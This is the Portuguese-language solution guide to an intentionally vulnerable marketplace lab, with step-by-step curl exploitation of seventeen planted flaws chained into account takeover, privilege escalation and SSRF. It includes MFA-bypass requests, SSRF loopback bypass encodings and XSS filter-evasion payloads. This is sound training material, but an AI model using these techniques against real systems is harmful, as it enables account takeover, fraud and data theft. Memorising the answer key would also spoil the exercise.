# Solução — Nexo Supply

Este documento apresenta a solução completa do laboratório. Use-o para conferir seus achados, entender as falhas que não identificou e observar como elas podem ser combinadas para ampliar o impacto de um ataque. Se quiser praticar a descoberta das vulnerabilidades, explore a aplicação antes de consultar os exemplos. Depois, compare seu raciocínio com os caminhos apresentados aqui.

---

## 1. O que existe na aplicação

A aplicação contém dezessete vulnerabilidades. A análise parte do perfil definido no escopo: um colaborador comum, com uma conta legítima criada pelo autocadastro.

| # | Vulnerabilidade |
|---|---|
| 1 | Ferramenta de migração descontinuada e seu relatório acessíveis sem autenticação |
| 2 | Enumeração de usuários pela resposta da API de login |
| 3 | Leitura do perfil de qualquer usuário pela troca do identificador |
| 4 | Identificador de conta aceito como prova de identidade na recuperação de senha |
| 5 | Conclusão do segundo fator com base no resultado informado pelo cliente |
| 6 | Exposição do nível administrativo em uma resposta da API |
| 7 | Aceitação de modelo interno de convite sem validar a autoridade de quem o envia |
| 8 | SSRF no diagnóstico de integrações com parceiros |
| 9 | Confiança dos serviços internos em requisições recebidas pelo loopback |
| 10 | Ficha de item acessível sem sessão |
| 11 | Alteração de item de outra organização |
| 12 | Operações administrativas sobre itens de outra organização |
| 13 | Leitura de cupons de outra organização |
| 14 | Duplicação de cupons além do limite de cupons ativos |
| 15 | XSS refletido na busca |
| 16 | XSS armazenado na descrição de item |
| 17 | Aceitação do valor do pedido informado pelo cliente na liquidação, inclusive de valores negativos |

A contagem considera dezessete falhas distintas. A manipulação do valor do pedido e a aceitação de valores negativos estão reunidas no item 17, pois decorrem da mesma falha de validação. Você pode organizar seu relatório de outra forma, inclusive por cadeia de ataque, desde que deixe claras as causas e os impactos.

Algumas dessas falhas têm impacto limitado quando analisadas isoladamente, mas permitem ataques mais graves quando combinadas. A seção 3 apresenta quatro cadeias de ataque que mostram essas relações.

---

## 2. Como encontrar cada uma

Primeiro, inicie o ambiente conforme as instruções do [LEIA-ME.md](LEIA-ME.md) e crie sua conta em `/cadastro` com o código `OCEAN-A-2026`. O cadastro oferece um bônus de 100 créditos, que pode ser resgatado uma única vez na **Carteira**. Use parte desse saldo para comprar um item de baixo valor e conhecer o fluxo de finalização da compra antes de testar suas validações.

Os valores dos exemplos variam entre as instâncias. Nomes de usuário, identificadores de conta e de produto, nome do arquivo de relatório e códigos de lote são gerados a partir de `LAB_SEED`, definido no arquivo `.env`. Substitua-os pelos valores encontrados no seu ambiente. Tickets, identificadores de desafio e chaves também devem ser substituídos pelos valores completos retornados nas suas requisições; alguns aparecem abreviados nos exemplos.

Para usar os exemplos com `curl`, defina o endereço da aplicação, faça login e salve o cookie de sessão:

```bash
B=http://localhost:8080

curl -s -c cookies.txt -X POST "$B/api/auth/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"SEU_USUARIO","password":"SUA_SENHA"}'
```

Nas requisições seguintes, use `-b cookies.txt` para enviar o cookie salvo. Você também pode usar um proxy de interceptação para observar as requisições do navegador, modificá-las e repeti-las.

### 1. Ferramenta de migração exposta

Comece pelo arquivo `robots.txt`, que pode revelar caminhos úteis para a análise:

```bash
curl -s $B/robots.txt
```

Entre os caminhos listados está `Disallow: /assets/archive/`. Esse endereço leva à interface de um importador de catálogo desativado, que permaneceu publicada após a migração.

A página tem um botão para abrir o relatório do lote, mas o endereço não está diretamente no HTML. Ele é reconstruído por um JavaScript ofuscado, que embaralha caracteres em posições pares e ímpares, aplica XOR com uma chave rotativa e concatena partes do prefixo. Para descobrir o endereço, clique no botão e observe a requisição no proxy. Outra opção é analisar o script e reverter a ofuscação.

O relatório é um arquivo JSON acessível sem autenticação. Use o nome de arquivo encontrado na sua instância:

```bash
curl -s $B/assets/archive/migration-report-2025.json
```

```json
"services": {
  "legacy_catalog_service": "http://127.0.0.1:8088",
  "health_endpoint": "/internal/catalog/status",
  "decommission_state": "somente leitura, aguardando conciliacao final antes do desligamento"
},
"accounts": [
  {"login": "thiago.teixeira", "organization": "atlantico",
   "record_state": "migrated", "legacy_customer_ref": "LC-38503"}
]
```

O relatório revela duas informações que serão úteis em etapas diferentes: os nomes de usuário de quatro colaboradores da Atlântico e o endereço de um serviço interno. Use os nomes na próxima etapa e guarde o endereço para investigar depois.

A lista contém quatro dos seis colaboradores da organização. **Nenhum deles é administrador.**

### 2. Enumeração de usuários

Envie uma tentativa de login com uma senha incorreta para uma conta existente:

```bash
curl -s -X POST $B/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"thiago.teixeira","password":"errada"}'
```

```json
{"error":"invalid credentials","reference":"U-90637169"}
```

Depois, repita a tentativa com uma conta inexistente. A mensagem de erro e o código de status HTTP são os mesmos, mas a resposta não contém o campo `reference`. A tela de login mostra "Usuário ou senha inválidos" nos dois casos. A diferença aparece apenas na resposta da API, por isso é necessário inspecioná-la no proxy ou no `curl`.

O valor `U-90637169` é o identificador interno do usuário e será usado na próxima etapa.

Após cinco falhas para o **mesmo nome de usuário**, o login passa a responder com o status HTTP 428 e exige uma verificação adicional. Essa proteção limita tentativas repetidas de senha, mas não impede a enumeração descrita aqui, que usa uma tentativa por conta.

### 3. Leitura do perfil de outro usuário

Abra **Minha conta** pelo menu com seu nome, no topo da página. No proxy, observe a requisição feita pela interface:

```
GET /api/users/profile?uid=<seu-proprio-uid>
```

Ao enviar seu identificador, você recebe os dados do próprio perfil, incluindo o campo `account_id`. Para testar o controle de acesso, substitua o parâmetro `uid` pelo identificador de outro usuário:

```bash
curl -s -b cookies.txt "$B/api/users/profile?uid=U-90637169"
```

```json
{
  "uid": "U-90637169",
  "username": "thiago.teixeira",
  "name": "Thiago Teixeira",
  "city": "Joinville", "state": "SC",
  "store": "Atlântico Distribuidora",
  "role": "user",
  "account_id": "f42ba1cd100f758e480614d264feec09",
  "member_since": "2025-12-07"
}
```

A requisição retorna o perfil de qualquer usuário, inclusive de outra organização. Embora o endpoint seja apenas de leitura e não retorne e-mail, senha nem segredo do segundo fator, ele expõe o `account_id`. Esse campo permite avançar na exploração descrita no próximo item.

### 4. Recuperação de senha com identificador

A tela `/recuperar` pede o nome de usuário e o identificador da conta. O fluxo trata o `account_id` como se fosse um segredo conhecido apenas pelo titular:

```bash
curl -s -X POST $B/api/auth/recover/verify -H 'Content-Type: application/json' \
  -d '{"username":"thiago.teixeira","account_id":"f42ba1cd100f758e480614d264feec09"}'
```

```json
{"ok":true,"ticket":"qUZiXQ6QXUF_pjOEDveW23si351o-Lbp","name":"Thiago Teixeira"}
```

```bash
curl -s -X POST $B/api/auth/recover/complete -H 'Content-Type: application/json' \
  -d '{"ticket":"qUZiXQ...","password":"NovaSenha!2026"}'
```

Com a senha redefinida, você pode tentar entrar na conta. Contas administrativas ainda exigem o segundo fator, tratado no próximo item. O ticket é de uso único, expira em quinze minutos, e a troca de senha encerra as sessões abertas do titular. Esses controles são úteis, mas não corrigem a falha na verificação de identidade.

A causa da falha é tratar um identificador como credencial. O `account_id` aparece no perfil e no rodapé dos comprovantes em `/pedidos`, portanto não é um segredo adequado para comprovar a identidade de quem solicita a recuperação.

### 5. Contorno do segundo fator de autenticação

Contas administrativas exigem um segundo fator de autenticação. Para essas contas, o login retorna:

```json
{"mfa_required":true,"challenge_id":"ixuEDlqBPLJZWCFZpSZgxtKN","delivery":"authenticator_app"}
```

Observe as **duas requisições** feitas pela interface em seguida. A primeira verifica o código do segundo fator, com limite de tentativas e prazo de validade:

```bash
curl -s -X POST $B/api/auth/mfa/verify -H 'Content-Type: application/json' \
  -d '{"challenge_id":"ixuEDl...","code":"000000"}'
```

```json
{"challenge_id":"ixuEDl...","challenge_status":"failed","attempts_left":5}
```

A segunda conclui o desafio de autenticação, mas confia no resultado informado pelo cliente:

```bash
curl -s -X POST $B/api/auth/mfa/complete -H 'Content-Type: application/json' \
  -c cookies.txt \
  -d '{"challenge_id":"ixuEDl...","challenge_status":"passed"}'
```

```json
{"ok":true,"redirect":"/painel"}
```

A sessão é aberta sem que um código correto tenha sido apresentado. O `challenge_id` precisa ser válido e estar dentro do prazo de validade. Portanto, é necessário concluir a etapa de senha antes de explorar essa falha. Na cadeia de ataque do laboratório, a recuperação de senha do item anterior permite cumprir esse pré-requisito.

O servidor deve registrar e consultar o resultado da verificação. Um estado de autenticação informado pelo cliente não comprova que o segundo fator foi validado.

### 6. Nível administrativo exposto

Com uma sessão administrativa, consulte:

```bash
curl -s -b cookies.txt $B/api/admin/me
```

```json
{
  "username": "isabela.alves", "role": "store_admin",
  "store_id": 2, "store": "Atlântico Distribuidora",
  "scope": "store", "management_level": 3
}
```

O campo `management_level` não aparece na interface. Isoladamente, ele não concede acesso, não altera dados e não expõe informações de terceiros. Seu valor está em revelar parte do modelo interno de permissões: o nível 3 sugere uma hierarquia que merece investigação. O próximo item mostra como confirmar a existência de um nível superior. No relatório, descreva essa exposição como uma informação que auxilia a análise, com impacto limitado por si só.

### 7. Convite sem validação de autoridade

Em `/loja/convites`, um administrador pode indicar alguém para uma função administrativa e visualizar as permissões antes de enviar o convite. O seletor oferece dois modelos: `store_manager`, de nível 2, e `store_admin`, de nível 3.

Um terceiro modelo está definido no JavaScript da própria página:

```bash
curl -s $B/static/js/invitations.js | grep -A5 platform_operator
```

```js
platform_operator: {
  label: "Operador da plataforma",
  scope: "platform",
  permission_set: 4,
  summary: "Acesso transversal a todas as organizações e às ferramentas de integração."
}
```

O código do frontend contém os três modelos, mas o seletor exibe apenas os dois permitidos. Para testar a validação no servidor, envie o terceiro modelo diretamente à API. A primeira tentativa, destinada a uma colaboradora comum, é recusada:

```bash
curl -s -b cookies.txt -X POST $B/api/admin/invitations \
  -H 'Content-Type: application/json' \
  -d '{"usuario":"joana.brandao","store_id":2,"template":"platform_operator"}'
```

```json
{"error":"Este modelo está acima do seu nível administrativo.","code":"template_level"}
```

A mensagem de erro não revela qual condição causou a recusa. Nesse caso, a validação considera o nível do **destinatário** do convite. Repita a requisição usando outro administrador da mesma loja como destinatário:

```bash
curl -s -b cookies.txt -X POST $B/api/admin/invitations \
  -H 'Content-Type: application/json' \
  -d '{"usuario":"paulo.vasques","store_id":2,"template":"platform_operator"}'
```

```json
{"id":1,"target":"paulo.vasques","template":"platform_operator",
 "permission_set":4,"status":"pending"}
```

A regra de negócio exige que o candidato a operador da plataforma já seja administrador de loja. O código verifica essa condição, mas não confere se **quem envia o convite** tem autoridade para conceder permissões de plataforma. Assim, um administrador de loja consegue convidar outro administrador do mesmo nível para se tornar operador global.

A validação de autorização deve considerar tanto a elegibilidade do destinatário quanto a autoridade de quem concede a permissão.

### 8. SSRF no diagnóstico de integrações

Somente o operador da plataforma tem acesso a `/plataforma/integracoes`. Essa ferramenta valida o endpoint de catálogo de um parceiro antes da configuração da sincronização. Ao informar `https://partner.example.com/catalog/status`, você recebe uma resposta com a versão do catálogo e a quantidade de itens.

Em seguida, informe o endereço interno encontrado no item 1:

```bash
curl -s -b cookies.txt -X POST $B/api/platform/integrations/diagnostics \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1:8088/internal/catalog/status"}'
```

```json
{"error":"Endereço não permitido para validação externa.","outcome":"rejected"}
```

O filtro compara a representação textual do endereço. As formas alternativas abaixo permitem contornar essa validação e alcançar o mesmo endereço de loopback, usado para comunicação local:

| Forma | Observação |
|---|---|
| `http://127.1:8088/...` | notação abreviada |
| `http://2130706433:8088/...` | endereço representado como um número inteiro decimal |
| `http://0x7f.0.0.1:8088/...` | notação hexadecimal |
| `http://qualquer@127.1:8088/...` | informação de usuário (`userinfo`) antes do endereço do servidor |
| `http://0177.0.0.1:8088/...` | notação octal |
| `http://[::ffff:127.0.0.1]:8088/...` | IPv4 mapeado em IPv6 |
| `http://[::ffff:7f00:1]:8088/...` | IPv4 mapeado em IPv6, com representação hexadecimal |
| `http://127.0.0.1.nip.io:8088/...` | domínio público que aponta para o loopback |
| `http://localtest.me:8088/...` | domínio público que aponta para o loopback, dependendo da resolução DNS disponível |

Essas formas contornam a validação textual. O laboratório também possui uma segunda camada de controle, que resolve o nome e só permite a requisição se todos os IPs resultantes forem endereços de loopback. A verificação é repetida a cada redirecionamento. Por isso, destinos como `1.1.1.1.nip.io` e `[::ffff:169.254.169.254]` continuam sendo recusados: essa camada mantém as requisições de diagnóstico restritas aos serviços locais do ambiente.

As alternativas que usam nomes de domínio dependem de resolução DNS. Para praticar sem conexão com a internet, use uma das representações numéricas.

URLs com portas inválidas, como `:99999` ou `:abc`, ou com colchetes não fechados são recusadas com o status HTTP 422, em vez de causar um erro interno no servidor.

Mesmo restrita ao loopback, uma falha de SSRF pode permitir o acesso a serviços internos que não deveriam estar disponíveis ao usuário. O próximo item mostra esse impacto no laboratório.

### 9. Serviços internos sem autenticação própria

O conector na porta `8088` responde às requisições recebidas pelo loopback sem autenticar quem as enviou. Ele foi implementado com a premissa de que apenas a própria aplicação teria acesso. O serviço de arquivamento na porta `9203` exige uma chave de sessão, mas essa chave é emitida pelo conector, que não exige autenticação.

Na prática, a proteção dependia da restrição de acesso pela rede. Quando a SSRF permite alcançar o conector, também permite obter a chave exigida pelo serviço de arquivamento. A combinação dos itens 8 e 9 leva ao acesso a dados de faturamento, como descrito na Cadeia D.

### 10. Ficha de item acessível sem sessão

Obtenha o ID de um produto no catálogo e repita as requisições sem enviar o cookie de sessão:

```bash
curl -s $B/api/products/281
curl -s $B/produto/281
```

As duas requisições retornam os dados do item. Já a listagem, em `GET /api/products`, retorna o status HTTP 401 quando não há autenticação.

Para registrar esse comportamento como vulnerabilidade, considere a regra de acesso esperada. Conteúdo público por decisão de produto não constitui uma falha. Neste cenário, o catálogo corporativo é restrito, mas a proteção foi aplicada apenas à listagem, deixando as fichas individuais acessíveis. O achado deve explicar essa inconsistência e quais informações ela expõe.

### 11. Alteração de item de outra organização

Com uma conta comum, escolha um item de outra organização:

```http
PUT /api/products/ID
Content-Type: application/json
Cookie: nexo_session=SESSAO

{"name":"Item alterado na prática"}
```

O nome do item é alterado sem verificação de autoria ou de vínculo com a loja. Registre a evidência e, em seguida, restaure o valor original.

O endpoint ignora alterações nos campos `status`, `created_by` e `destination_store`, sem retornar um aviso. Esses campos não demonstram a falha descrita aqui. Comparar o comportamento deles com o do campo `name` ajuda a identificar quais alterações são aceitas.

### 12. Operações administrativas fora da organização

Com uma sessão de supervisor ou administrador, obtenha o ID de um item pendente de **outra organização**. Repita a requisição de aprovação, alterando apenas o ID:

```http
POST /api/admin/products/ID/approve
Cookie: nexo_session=SESSAO_ADMINISTRATIVA
```

O endpoint verifica a função do usuário, mas não verifica se o item pertence à organização que ele administra. As operações de recusa e remoção apresentam o mesmo defeito. Uma demonstração da aprovação é suficiente para comprovar a causa; não é necessário remover itens do catálogo.

### 13. Cupons de outra organização

```http
GET /api/admin/stores/ID/coupons
Cookie: nexo_session=SESSAO_ADMINISTRATIVA
```

Substitua o ID da loja pelo de outra organização e compare a resposta. A falha é semelhante à do item anterior: o endpoint permite acessar recursos de uma organização fora do escopo de atuação do usuário. Neste caso, os dados expostos são os cupons.

### 14. Duplicação de cupons acima do limite

Como administrador, emita cupons de baixo valor na própria loja até que o fluxo normal de criação recuse novos cupons. O limite é de 20 cupons ativos. Em seguida, tente duplicar um cupom existente:

```http
POST /api/admin/coupons/ID/duplicate
Cookie: nexo_session=SESSAO_ADMINISTRATIVA
```

A duplicação permite ultrapassar o limite, desde que a loja tenha saldo. A validação foi implementada no fluxo de criação, mas não no de duplicação.

Conte os cupons ativos antes e depois da requisição. Se a duplicação for recusada por falta de saldo, o resultado não permite concluir se o limite de cupons foi validado.

### 15. XSS refletido

Com uma sessão autenticada, abra:

```
/busca?q=%3Csvg%2Fonload%3Dalert(1)%3E
```

O termo de busca é inserido na página sem a codificação adequada para o contexto HTML. Confirme no navegador se o JavaScript é executado. A presença do payload (o código usado no teste) na resposta, por si só, não comprova a execução.

### 16. XSS armazenado

A descrição do item passa por um filtro próprio da aplicação. Ele remove blocos e tags `<script>` e repete a limpeza até que o texto não sofra novas alterações. Por isso, a sequência `<scr<script>ipt>` é bloqueada. O filtro também remove atributos de evento precedidos de espaço, com ou sem aspas no valor.

| Bloqueado pelo filtro | Aceito pelo filtro |
|---|---|
| `<script>alert(1)</script>` | `<img/src=x/onerror=alert(1)>` |
| `<img src=x onerror="alert(1)">` | `<svg/onload=alert(1)>` |
| `<img src=x onerror=alert(1)>` | `<details/open/ontoggle=alert(1)>` |

O filtro não considera o uso da barra como separador de atributos. Ele procura atributos de evento precedidos de espaço, mas o navegador também interpreta os exemplos com `/` mostrados na tabela.

Crie um item pelo fluxo normal e substitua a descrição por `<img/src=x/onerror=alert(1)>`. O payload é executado em dois locais: na fila de revisão da loja, em `/loja/revisao`, e na ficha do item, em `/produto/{id}`. Essa ficha exibe a mesma descrição mesmo para quem não está autenticado, o que amplia a exposição e facilita a demonstração da falha.

Não há um robô que visite automaticamente a fila de revisão, e nenhuma cadeia deste laboratório depende da obtenção de cookies de outros usuários. O cookie de sessão está configurado sem `HttpOnly` para permitir a demonstração do acesso ao cookie por JavaScript.

### 17. Valor do pedido definido pelo cliente

O fluxo de finalização da compra tem quatro etapas. A tentativa de alterar o preço em `/api/checkout/confirm` é recusada:

```json
{"error":"O valor informado não corresponde ao pedido.","code":"total_mismatch"}
```

A última etapa, porém, aceita o valor informado pelo cliente. Prepare e confirme um pedido normalmente, guarde o `checkout_token` e altere o valor apenas na liquidação:

```http
POST /api/checkout/complete
Content-Type: application/json
Cookie: nexo_session=SESSAO

{"checkout_token":"TOKEN_DO_PEDIDO","total":1}
```

Confira o campo `settled_total`, os dados do pedido e seu saldo para verificar o valor efetivamente usado na transação.

A mesma falha permite enviar valores negativos, pois a faixa aceita vai de `-1000` a `20000`. Prepare **outro pedido**, confirme-o e envie `total: -10` na liquidação. O saldo do comprador aumenta em vez de diminuir, enquanto o caixa da loja é debitado. Não reutilize um pedido já liquidado.

O saldo do caixa da loja não pode ficar abaixo de zero, o que limita o efeito desse comportamento no cenário.

---

## 3. Cadeias de ataque

As cadeias abaixo mostram como falhas de impacto limitado podem ser combinadas para assumir contas, ampliar privilégios e alcançar dados internos da plataforma.

O marketplace tem duas organizações: **Meridiano Suprimentos**, onde você cria sua conta, e **Atlântico Distribuidora**, alvo dessas cadeias de ataque. Há ainda uma terceira organização, **Nexo Supply — Operações**, que não participa do marketplace e abriga a conta do operador da plataforma. Ela só fica visível após a elevação de privilégios.

```
exposição de informações → tomada de conta na Atlântico
        ↓
administrador da Atlântico, pelo contorno do segundo fator
        ↓
operador da plataforma, pelo fluxo de convite
        ↓
SSRF em dois estágios → dados de faturamento
```

### Cadeia A — da exposição de informações à tomada de conta

Esta cadeia combina os itens 1, 2, 3 e 4, nessa ordem.

O arquivo `robots.txt` indica o diretório do importador desativado. Nessa página, o botão de acesso ao relatório usa um endereço reconstruído pelo JavaScript ofuscado. O relatório revela quatro nomes de usuário da Atlântico. Faça uma tentativa de login por conta para obter os identificadores internos. Em seguida, substitua o `uid` na consulta de perfil para obter o `account_id`. Por fim, use o nome de usuário e o `account_id` na recuperação de senha para assumir a conta.

O resultado é um movimento lateral: a partir de uma conta na Meridiano, você passa a ter acesso a uma conta da Atlântico.

O exercício mostra por que é necessário avaliar a relação entre os achados. Um relatório antigo pode parecer pouco relevante; a enumeração, apenas uma confirmação de existência; e o perfil, uma consulta sem dados sensíveis. A recuperação ainda pede dois identificadores, o que pode dar a impressão de uma verificação suficiente. No entanto, todas as informações exigidas podem ser obtidas pelas falhas anteriores, permitindo assumir a conta sem interação do titular.

### Cadeia B — administrador da organização

Esta cadeia combina a Cadeia A com o item 5.

Com acesso à Atlântico, o próximo passo é identificar seus administradores. A página **Organização**, em `/equipe`, lista os colaboradores por primeiro nome e cidade, sem exibir o nome de usuário nem a função. Essa limitação é intencional: a página não fornece diretamente as informações necessárias para identificar as contas administrativas.

A pista está na aba **Histórico de aprovações**, em `/equipe/aprovacoes`:

```
Item                          Revisado por        Data
Compressor de ar 20 pés       viviane.quintela    12/03/2025
Chave de impacto pneumática   viviane.quintela    28/02/2025
Botina de segurança           paulo.quintela      15/02/2025   ← fora do padrão
Armário para EPI 16 portas    viviane.quintela    03/02/2025
```

O supervisor realiza as revisões de rotina e aparece na maioria dos registros. Os poucos itens revisados por outras pessoas ajudam a identificar os administradores. A mesma informação aparece na ficha de cada item, no campo "Publicação revisada por".

Há dois administradores, cada um responsável pela revisão de um item diferente. Essa configuração permite que dois alunos trabalhem em paralelo, usando contas distintas. Você precisará de acesso às duas contas na Cadeia C.

Com o nome de usuário do administrador escolhido, repita as etapas de enumeração, consulta de perfil e recuperação de senha da Cadeia A. O login exigirá o segundo fator antes de abrir a sessão. Nesse ponto, aplique o item 5: envie um código incorreto a `/api/auth/mfa/verify` e, depois, chame `/api/auth/mfa/complete` com o mesmo `challenge_id`, informando `challenge_status: passed`.

**Por que essa recuperação funciona apenas para os administradores da Atlântico:** as contas administrativas das outras organizações usam um provedor de identidade corporativo. Para elas, a recuperação de senha é recusada com o status HTTP 409 e a mensagem `federated account`. Você pode confirmar esse comportamento ao testar a conta administrativa da Meridiano. As contas administrativas da Atlântico foram importadas do sistema legado e usam senhas locais, conforme indicado no relatório de migração.

### Cadeia C — operador da plataforma

Esta cadeia combina os itens 6 e 7 e exige acesso às duas contas administrativas da Atlântico por meio da Cadeia B.

O campo `management_level: 3`, retornado por `/api/admin/me`, indica uma hierarquia de permissões. O arquivo `invitations.js` confirma a existência do modelo `platform_operator`, com `permission_set: 4`. A API recusa esse modelo quando o destinatário é um colaborador comum ou supervisor, mas o aceita quando o destinatário é outro administrador de loja.

Por isso, é necessário assumir o controle das **duas contas administrativas** da Atlântico. Ambas aparecem no histórico de aprovações e usam senhas locais. Use uma delas para enviar o convite à outra. Depois, entre na conta destinatária, abra `/convites` e aceite a indicação. A opção **Plataforma** passa a aparecer no menu.

Ao final, você terá passado de uma conta criada por autocadastro a uma conta com permissões de operador global, explorando falhas nas funcionalidades da aplicação.

### Cadeia D — SSRF em dois estágios

Esta cadeia combina os itens 8 e 9 e conclui o caminho até os dados internos de faturamento.

Como operador da plataforma, acesse `/plataforma/integracoes`. Use uma das representações alternativas do endereço de loopback para contornar o filtro textual e alcançar o conector:

```bash
curl -s -b cookies.txt -X POST $B/api/platform/integrations/diagnostics \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1:8088/internal/catalog/status"}'
```

Os dados foram removidos do conector durante sua desativação. A resposta restante indica o serviço em que eles estão armazenados e como acessá-lo:

```json
"reconciliation": {"batch": "rec-2024-06", "batches_pending": 2, "records_awaiting_review": 31},
"reconciliation_archive": {
  "host": "127.0.0.1", "port": 9203,
  "path": "/reconciliation/records",
  "required_query": ["batch", "key"],
  "key_issued_by": "/internal/catalog/handoff"
}
```

O serviço de arquivamento na porta `9203` recusa consultas sem uma chave de sessão. A mensagem de erro informa onde obtê-la:

```json
{"error":"missing session key",
 "detail":"Consulta exige chave de sessao. Solicite em /internal/catalog/handoff no conector de catalogo."}
```

Repita a requisição de diagnóstico, desta vez apontando para o endpoint de handoff do conector. Nos exemplos abreviados abaixo, `...` representa o mesmo comando `curl` de diagnóstico, com apenas o conteúdo de `-d` substituído:

```bash
... -d '{"url":"http://127.1:8088/internal/catalog/handoff"}'
```

```json
{"batch":"rec-2024-06","key":"a96149390b8b90cc427484c50a9d4bb3723da0ef",
 "expires_in_seconds":164,
 "usage":"GET http://127.0.0.1:9203/reconciliation/records?batch=rec-2024-06&key=<key>"}
```

A chave tem validade de cinco minutos e é derivada da semente da instância. Use a chave obtida no seu ambiente enquanto ela estiver válida. Faça uma terceira requisição por meio da SSRF, agora com o lote e a chave informados na resposta:

```bash
... -d '{"url":"http://127.1:9203/reconciliation/records?batch=rec-2024-06&key=a961493..."}'
```

```json
{"classification": "restrito — dados de faturamento de clientes",
 "billing_records": [
   {"legacy_id":"LC-24382","type":"internal","contact_name":"Bruno Henriques",
    "email":"bruno.henriques@nexosupply.example","phone":"+55 42 92864-5971",
    "document":"147.169.228-53","company":"Cerrado Manutencao",
    "company_document":"91.827.826/0001-21",
    "billing":{"brand":"mastercard","card_number":"5105105105105100",
               "cardholder":"BRUNO HENRIQUES","expires":"10/28","billing_zip":"81977-830"},
    "credit_limit":69000,"contract":"CT-2024-210"}
 ]}
```

A resposta contém quatorze registros com nome, documento, contrato e dados de cartão.

Todos os dados são sintéticos. Os documentos são gerados sem dígito verificador válido, e os cartões usam faixas de teste publicadas pelas bandeiras. Nenhuma pessoa real está representada.
